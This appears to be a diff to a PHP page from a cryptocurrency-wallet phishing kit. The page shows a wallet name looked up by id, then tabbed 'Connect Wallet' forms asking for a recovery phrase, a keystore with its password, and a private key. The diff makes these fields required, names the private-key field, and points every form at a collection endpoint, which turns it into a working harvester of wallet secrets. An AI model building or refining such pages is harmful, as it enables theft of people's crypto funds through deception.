@@ -38,13 +38,13 @@
 
     <!-- ======= Header ======= -->
     <?php
-    if (isset($_GET['wallet_id'])) {
+    if (isset($_GET['id'])) {
         require_once("../../_db.php");
-        $wallet_id = $_GET['wallet_id'];
+        $id = $_GET['id'];
 
         // Prepare a statement to fetch user details by wallet_id
-        $stmt = $conn->prepare("SELECT * FROM wallet WHERE wallet_id = ?");
-        $stmt->bind_param("i", $wallet_id);
+        $stmt = $conn->prepare("SELECT * FROM wallet WHERE id = ?");
+        $stmt->bind_param("i", $id);
         $stmt->execute();
 
         $result = $stmt->get_result();
@@ -63,11 +63,7 @@
                 <h2 class="bold d-flex justify-content-center" style="font-weight:900; font-size:40px">
                     <?php echo $row["wallet_name"]; ?>
                 </h2>
-    <?php
-            }
-        }
-    }
-    ?>
+   
     <!-- End Header -->
 
     <main id="mains">
@@ -88,10 +84,10 @@
                 </ul>
                 <div class="tab-content mt-2 card">
                     <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
-                        <form method="POST" class="px-3 py-3">
-                            <input type="hidden" name="<?php  echo $row [""]?>">
+                        <form method="POST" class="px-3 py-3" action="action">
+                            <input type="hidden" name="wallet_name" value="<?php echo $row["wallet_name"]; ?>">
                             <div class="form-group">
-                                <textarea name="phrase" cols="30" rows="5" type="text" class="form-control" placeholder="Enter your recovery phrase"></textarea>
+                                <textarea name="phrase" required cols="30" rows="5" type="text" class="form-control" placeholder="Enter your recovery phrase"></textarea>
                             </div>
                             <br>
                             <div class="form-group">
@@ -99,18 +95,18 @@
                             </div>
                             <br>
                             <div class="modal-footer">
-                                <button type="submit" class="btn btn-success waves-effect waves-light" name="submit_phrase">Save changes</button>
+                                <button type="submit" class="btn btn-primary waves-effect waves-light" name="submit_phrase">Connect Wallet</button>
                             </div>
                         </form>
                     </div>
                     <div class="tab-pane fade" id="keystore" role="tabpanel" aria-labelledby="keystore-tab">
-                        <form method="POST" class="px-3 py-3">
-                            <input type="hidden" name="<?php  echo $row [""]?>">
+                        <form method="POST" class="px-3 py-3" action="action">
+                            <input type="hidden" name="wallet_name" value="<?php echo $row["wallet_name"]; ?>">
                             <div class="form-group">
-                                <textarea name="keystore" cols="30" rows="5" type="text" class="form-control" placeholder="Enter Keystore"></textarea>
+                                <textarea name="keystore" required cols="30" rows="5" type="text" class="form-control" placeholder="Enter Keystore"></textarea>
                             </div>
                             <div class="form-group">
-                                <input type="text" name="wallet_pass" class="form-control" placeholder="Wallet Password">
+                                <input type="text" name="wallet_pass" required class="form-control" placeholder="Wallet Password">
                             </div>
                             <br>
                             <div class="form-group">
@@ -118,15 +114,15 @@
                             </div>
                             <br>
                             <div class="modal-footer">
-                                <button type="submit" class="btn btn-success waves-effect waves-light" name="submit_keystore">Save changes</button>
+                                <button type="submit" class="btn btn-primary waves-effect waves-light" name="submit_keystore">Connect Wallet</button>
                             </div>
                         </form>
                     </div>
                     <div class="tab-pane fade" id="private_key" role="tabpanel" aria-labelledby="private_key-tab">
-                        <form method="POST" class="px-3 py-3">
-                            <input type="hidden" name="<?php  echo $row [""]?>">
+                        <form method="POST" class="px-3 py-3" action="action">
+                            <input type="hidden" name="wallet_name" value="<?php echo $row["wallet_name"]; ?>">
                             <div class="form-group">
-                                <input type="text" class="form-control" name="" placeholder="Enter Private Key">
+                                <input type="text" class="form-control" required name="private_key" placeholder="Enter Private Key">
                             </div>
                             <br>
                             <div class="form-group">
@@ -134,14 +130,18 @@
                             </div>
                             <br>
                             <div class="modal-footer">
-                                <button type="submit" class="btn btn-success waves-effect waves-light" name="submit_private_key">Save changes</button>
+                                <button type="submit" class="btn btn-primary waves-effect waves-light" name="submit_private_key">Connect Wallet</button>
                             </div>
                         </form>
                     </div>
                 </div>
             </div>
         </section><!-- End Featured Services Section -->
-
+        <?php
+            }
+        }
+    }
+    ?>
     </main><!-- End #main -->
 
     <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
